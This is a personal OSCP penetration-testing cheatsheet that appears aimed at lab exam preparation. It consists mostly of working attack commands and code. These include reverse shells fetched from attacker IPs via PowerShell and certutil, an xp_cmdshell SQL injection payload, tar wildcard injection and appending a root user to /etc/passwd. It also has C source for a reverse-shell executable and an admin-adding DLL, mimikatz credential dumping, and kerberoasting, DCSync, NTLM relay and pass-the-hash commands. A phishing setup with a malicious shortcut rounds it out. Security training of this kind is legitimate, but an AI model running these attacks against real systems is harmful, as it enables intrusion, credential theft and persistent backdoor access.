https://git.leonardotamiano.xyz/leo/OSCP/src/branch/main/cheatsheet.org#user-content-headline-4
* Exploitation

** Web
*** SQLi
** Linux
   Add root user to passwd file (root2:w00t)
   #+begin_example
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
   #+end_example

   Abuse tar wildcard ~tar -zxf /tmp/backup.tar.gz *~
   #+begin_example
echo "python3 /tmp/rev.py" > demo.sh
touch -- "--checkpoint-action=exec=sh demo.sh"
touch -- "--checkpoint=1"
   #+end_example
  
** Windows
   TODO: 
   https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
   https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
   https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

   ---------------
   
   three steps to get reverse shell using unreliable exploit
   #+begin_example
payload_1 = f'cmd.exe /c mkdir C:\TEMP'.encode('utf-8')
payload_3 = f'powershell -c "iwr -uri http://192.168.45.215/shell.exe -Outfile C:\TEMP\shell.exe"'.encode('utf-8')
payload_4 = f'cmd.exe /c "C:\TEMP\shell.exe"'.encode('utf-8')
   #+end_example

   ---------------
   
   SQLi using ~xp_cmdshell~

   First we enable xp_cmdshell

   #+begin_example
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
   #+end_example

   and then we can execute our code

   #+begin_example
EXEC xp_cmdshell 'whoami';
   #+end_example

   to get a reverse shell execute
   
   #+begin_example
' ; EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.248:1337/Invoke-PowerShellTcp.ps1\")" '; --
   #+end_example

   ---------------
   
   Exploit ~SeImpersonatePriv~
   #+begin_example
./PrintSpoofer64.exe -c "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
.\PrintSpoofer64.exe -i -c powershell.exe
   #+end_example
    
   #+begin_example
./GodPotato-NET2.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
./GodPotato-NET4.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
./GodPotato-NET35.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"n
   #+end_example

   ---------------

   Dumping logon passwords with mimikatz
    
   #+begin_example
./mimikatz64.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
   #+end_example

   Dumping LSA with mimikatz
   #+begin_example
reg save hklm\sam sam.hiv
reg save hklm\security security.hiv
reg save hklm\system system.hiv
./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
   #+end_example

   #+begin_example
./mimikatz64.exe "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM" "exit"
./mimikatz64.exe "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
   #+end_example

   ---------------
    
   Change user. Requires GUI, such as a RDP session.

   #+begin_example
runas /user:backupadmin cmd
   #+end_example
   
    
   ---------------

   Cross-Compilation for malicious exe
    
   Cross compile for windows
   #+begin_src c
#include <stdlib.h>

int main ()
{
  system("C:\TEMP\ncat.exe 192.168.45.217 7777 -e cmd");
  
  return 0;
}

   #+end_src

   #+begin_example
   x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
   #+end_example

   ---------------

   Cross-Compilation for malicious DLL

   #+begin_src c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
		      HANDLE hModule,// Handle to DLL module
		      DWORD ul_reason_for_call,// Reason for calling function
		      LPVOID lpReserved ) // Reserved
{
  switch ( ul_reason_for_call )
    {
    case DLL_PROCESS_ATTACH: // A process is loading the DLL.
      int i;
      i = system ("net user dave2 password123! /add");
      i = system ("net localgroup administrators dave2 /add");
      break;
    case DLL_THREAD_ATTACH: // A process is creating a new thread.
      break;
    case DLL_THREAD_DETACH: // A thread exits normally.
      break;
    case DLL_PROCESS_DETACH: // A process unloads the DLL.
      break;
    }
  return TRUE;
}
   #+end_src

   #+begin_example
x86_64-w64-mingw32-gcc adduser_dll.c --shared -o adduser.dll  
   #+end_example

   ----------------------

** Windows AD

*** Bruteforcing kerberos
    https://github.com/ropnop/kerbrute

    TODO: bruteuser
    TODO: bruteforce
    TODO: paswordspray
    TODO: userenum
   
*** Kerberoasting
    through socks proxy using creds of web_svc 

    #+begin_example
proxychains impacket-GetUserSPNs -request -dc-ip 10.10.132.146 oscp.exam/web_svc
    #+end_example

    can also be done with rubeus
    https://github.com/GhostPack/Rubeus

    #+begin_example
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
    #+end_example

    then crack with

    #+begin_example
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.rule --force
    #+end_example

    -----------------------

    *Targeted kerberoasting*

    - leverage permission *GenericWrite* or *GenericAll* in order to set a
      particular SPN for a target user.

    - kerberoast that user and crack its passwords

    - remove the assigned SPN.

*** AS-REP roasting
    #+begin_example
proxychains impacket-GetNPUsers -dc-ip 192.168.221.70 -request -outputfile hashes corp.com/pete
    #+end_example

    Can also be done with rubeus

    #+begin_example
.\Rubeus.exe asreproast /nowrap
    #+end_example

    then crack with

    #+begin_example
sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
    #+end_example
   
    -------------------

    *Targeted AS-REP roasting*

    - leverage permission *GenericWrite* or *GenericAll* to modify the *User
      Account Control* value of our username target to not require
      kerberos pre-auth.

    - Perform typical AS-REP roasting.

*** DCsync attack
    To launch a DSsync attac, a user needs to have the following
    privileges:

    - Replicating Directory Changes
    - Replicating Directory Changes All
    - Replicating Directory Changes in Filtered Set rights.

    By default, members of the Domain Admins, Enterprise Admins, and
    Administrators groups have these rights assigned.
    
    Using mimikatz, provide the user for which we want to obtain creds

    #+begin_example
lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:corp\Administrator
    #+end_example

    using impacket-secretsdump. 

    #+begin_example
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"password"@192.168.50.70
    #+end_example
    
*** Silver tickets
    With the service account password or its associated NTLM hash at
    hand, we can forge our own service ticket to access the target
    resource (in our example, the IIS application) with any
    permissions we desire. This custom-created ticket is known as a
    *silver ticket* and if the service principal name is used on
    multiple servers, the silver ticket can be leveraged against them
    all.

    We need to collect the following three pieces of information to
    create a silver ticket:

    - SPN password hash
    - Domain SID
    - Target SPN

    To get the password hash of the SPN we can use a tool like
    mimikatz. To get the domain SID we can do ~whoami /user~

    #+begin_example
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
    #+end_example

    and to get the SPN we can enumerate SPN using ~impacket-GetUserSPNs~.
    
    With all of this info, we can forge a TGS (silver ticket) as
    follows within mimikatz

    #+begin_example
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:5d28cf5252d32971419580a51484ca09 /user:geffadmin
    #+end_example
    
*** Responder Net-NTLMv2 capture
    Obtain NTLM hashes of accounts by exploiting the Net-NTLMv2
    protocol. This is useful when we do not have the privileges to run
    mimikatz and dump NTLM hashes.

    - First we set up a fake SMB server

      #+begin_example
 sudo responder -I tun0
      #+end_example

    - Then we force the connection from the remote target using a
      compromised account of which we do not know the NTLM hash

      #+begin_example
 dir \\192.168.45.159\test
      #+end_example

    - Finally crack the hash with hashcat or john

      #+begin_example
 hashcat -m 5600 paul.hash rockyou.txt
      #+end_example

*** Net-NTLM relaying
    The idea now is to relay an NTLM info to another windows
    service. We can do this when we gain access to a user account in a
    machine, and we want to use its NTLM hash in another machine. If
    the relayed authentication is from a user with local administrator
    privileges, we can use it to authenticate and then execute
    commands over SMB with methods similar to those used by psexec or
    wmiexec.

    We can perform this attack using ~ntlmrelayx~. Notice here is that
    ~-t~ refers to the target we're relaying the NTLM hash to, while ~-c~
    is for the command to execute. In this case we're executing a
    powershell reverse shell that was encoded in base64.

    #+begin_example
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
    #+end_example
   
** Client-Side
*** Email phishing attack
    First we install and enable our ~webdav~ server

    #+begin_example
pip3 install wsgidav
pip3 install cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
    #+end_example

    Then we create a ~config.Library.ms~ file with the following
    content. Notice the IP address.

    #+begin_example
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.239</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
    #+end_example

    We craft a malicious ~powershell.lnk~ that contains our powershell
    payload. This step has to be done in a windows VM.

    #+begin_example
powershell -c "iex(new-object net.webclient).downloadstring('http://192.168.45.239:1337/Invoke-PowerShellTcp.ps1')"
    #+end_example

    and we send a malicious ~body.txt~

    #+begin_example
Hi,

 please click on the attachment :D
    #+end_example
    
    using ~smtp~ with ~swaks~

    #+begin_example
swaks -t jim@relia.com --from test@relia.com --attach @config.Library-ms --server 192.168.186.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
    #+end_example
    
* Post-Exploitation / Lateral Movement
  Here mainly stuff on windows AD, after we root a machine all the
  steps we need to take to proceed further and extract all data for
  the next machine until we get to the domain user.

** Linux
   Install cronjob to spawn reverse shell every minute at my IP

   TODO

** Windows
   
*** chisel and internal enumeration

    setup chisel tunnel
    #+begin_example
certutil -urlcache -split -f "http://192.168.45.170:1337/chisel64.exe" chisel64.exe
(local kali)    ./chisel server -p 8000 --reverse         
(remote window) chisel64.exe client 192.168.45.217:8000 R:socks 
    #+end_example

    enumerate ports
    #+begin_example
proxychains nmap -sT --top-ports=100 -Pn <IP>
    #+end_example

    enumerate services
    #+begin_example
proxychains crackmapexec smb IP1 IP2 -u USERNAME -p PASSWORD --shares
proxychains crackmapexec winrm IP1 IP2 -u USERNAME -p PASSWORD
proxychains crackmapexec rdp IP1 IP2 -u USERNAME -p PASSWORD
proxychains crackmapexec ssh IP1 IP2 -u USERNAME -p PASSWORD
proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HAHSH --shares
    #+end_example
    
*** PsExec
    To use this tool we need:

    - user that authenticates to the target machine needs to be a part
      of the Administrators local group.

    - ADMIN$ share must be available

    - File and Printer Sharing has to be turned on

    The last two requirements are met by default settings on modern
    Windows Server Systems.

    ---
    
    Pass the NTLM hash of admin to get shell on remote target

    - First we dump password with mimikatz

      #+begin_example
 ./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump:sam"
      #+end_example

    - Then we use the hash with psexec. Notice the format
      "LMHash:NTHash", where LMHash is set to 0 because we do not use it.

      #+begin_example
 impacket-psexec -hashes 00000000000000000000000000000000:7a39311ea6f0027aa955abed1762964b Administrator@192.168.50.212
      #+end_example

    - Another way is to also use ~wmiexec~

      #+begin_example
 impacket-wmiexec -hashes 00000000000000000000000000000000:7a32350ea6f0028ff955abed1762964b Administrator@192.168.50.212
      #+end_example

*** WMI, winRM and evil-winrm
    First with WMI (Windows Management Instrumentation), using
    powershell. The reverse shell here was generated based on the code
    found in [[Reverse Shells]].
    
    #+begin_example
$username = 'jen';
$password = 'password';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
    #+end_example

    --------------

    Then with WinRM, microsoft version of the WS-Management protocol.
    It uses port 5985 for encrypted HTTPs traffic and port 5986 for plain HTTP.

    ~winrs~ works only for domain users. For it to work, the domain user
    needs to be part of the Administrators or Remote Management Users
    group on the target host.

    #+begin_example
winrs -r:files04 -u:jen -p:passworddd  "cmd /c hostname & whoami"
    #+end_example

    To spawn a shell simply do

    #+begin_example
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
    #+end_example

    ----

    We can also use powershell via the ~New-PSSession~ cmdlet

    #+begin_example
$username = 'jen';
$password = 'password';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName 192.168.50.73 -Credential $credential

Enter-PSSession 1
    #+end_example

    ----

    Finally, we can use evil-winrm, which can be used either with the password (~-p~) or with the hash (~-H~)

    #+begin_example
proxychains evil-winrm -i 192.168.243.153 -u administrator -p Password
proxychains evil-winrm -i 10.10.132.146 -u admin -H 4979f29d4cb99845c075c41cf45f24df
    #+end_example

*** RDP
    
    Set up RDP by enabling RDP and adding administrator to RDP group
    #+begin_example
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe

# change admin password
$password = ConvertTo-SecureString "test!" -AsPlainText -Force
$UserAccount = Get-LocalUser -Name "Administrator"
$UserAccount | Set-LocalUser -Password $Password

# enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# add administrator to RDP group
net localgroup "Remote Desktop Users" "Administrator" /add

# connect to rdp
xfreerdp  /u:Administrator /p:"test!" /v:192.168.236.121 
    #+end_example

    Set up RDP by creating a new user for RDP   
    #+begin_example
$password = ConvertTo-SecureString "test!" -AsPlainText -Force
New-LocalUser "test" -Password $password -FullName "test" -Description "test"
Add-LocalGroupMember -Group "Administrators" -Member "test"
net localgroup "Remote Desktop Users" "test" /add
    #+end_example

    Enabled RDP remotely (first we open the port and configure the server, then we create a new user)
    #+begin_example
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1

$password = ConvertTo-SecureString "vau!XCKjNQBv3$" -AsPlainText -Force
New-LocalUser "test" -Password $password -FullName "test" -Description "test"
Add-LocalGroupMember -Group "Administrators" -Member "test"
net localgroup "Remote Desktop Users" "test" /add
    #+end_example  
    
*** pass the hash
    This technique requires an SMB connection through the firewall
    (commonly port 445) and the Windows File and Printer Sharing
    feature to be enabled.  This lateral movement technique also
    requires the admin share called ADMIN$ to be available. These
    requirements are common in internal enterprise environments. This
    type of lateral movement typically requires local administrative
    rights.

    The basic idea is that the attacker connects to the victim using
    the Server Message Block (SMB) protocol and performs
    authentication using the NTLM hash. Note that PtH uses the NTLM
    hash legitimately. However, the vulnerability lies in the fact
    that we gained unauthorized access to the password hash of a local
    administrator.

    We can use various tools such as:

    - *crackmapexec*

      #+begin_example
crackmapexec smb 192.168.242.147 -u web_svc -H 820d6348890293116990101307197053
      #+end_example

    - *evil-winrm*

      #+begin_example
proxychains evil-winrm -i 192.168.243.153 -u administrator -p Password
      #+end_example

    - *impacket-psexec*

      #+begin_example
 impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0038ee955abed1762964b Administrator@192.168.50.212
      #+end_example

    - *impacket-wmiexec*

      #+begin_example
 impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0038ee955abed1762964b Administrator@192.168.50.212
      #+end_example
    
*** overpass the hash
    With *overpass the hash*, we can "over" abuse an NTLM user hash to
    gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use
    the TGT to obtain a Ticket Granting Service (TGS).

    The idea is to turn the NTLM hash into a Kerberos ticket and avoid
    the use of NTLM authentication. A simple way to do this is with
    the *sekurlsa::pth* command from Mimikatz.

    #+begin_example
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372419bf6e93364cc93075 /run:powershell
    #+end_example

    At this point, we have a new PowerShell session that allows us to
    execute commands as jen. We can then access various services and
    have Kerberos generate for us a TGT and a TGS, thus converting an
    NTLM hash into a Kerberos TGT. We can then use this ticket into
    various tools, such as the official PsExec application from
    microsoft, which does not accept password hashes.
    
*** pass the ticket
    The Pass the Ticket attack takes advantage of the TGS, which may
    be exported and re-injected elsewhere on the network and then used
    to authenticate to a specific service. If the service tickets
    belong to the current user, then no administrative privileges are
    required.

    First we export all TGT/TGS tickets from memory within the jen
    session using the command ~sekurlsa::tickets /export~. This command
    parses the LSASS process space in memory in order to look for any
    TGT/TGS, which are saved to disk in the kirbi mimikatz format.
    
    #+begin_example
PS C:\Windows\system32> whoami
corp\jen
    #+end_example

    #+begin_example
mimikatz # privilege::debug
...
mimikatz # sekurlsa::tickets /export
    #+end_example

    We can then pick any ticket and inject it through mimikatz via the
    ~kerberos::ptt~ command

    #+begin_example
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
    #+end_example

    and now we can run ~klist~ in order to print the current available tickets

    #+begin_example
klist
    #+end_example
    
*** TODO DCOM
*** TODO Golden ticket
*** TODO Shadow copies
* Reporting
  https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
